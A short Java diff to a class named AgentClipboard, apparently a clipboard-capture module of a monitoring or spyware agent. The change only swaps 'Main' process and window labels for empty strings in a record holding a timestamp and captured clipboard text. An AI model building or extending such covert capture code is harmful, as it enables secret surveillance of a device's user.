@@ -44,8 +44,8 @@ public class AgentClipboard extends AgentBase {
 		
 		final byte[] tm = (new DateTime()).getStructTm();
 		byte[] payload = WChar.getBytes(ret.toString(), true);
-		byte[] process = WChar.getBytes("Main", true);
-		byte[] window = WChar.getBytes("Main", true);
+		byte[] process = WChar.getBytes("", true);
+		byte[] window = WChar.getBytes("", true);
 		
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
 		items.add(tm);
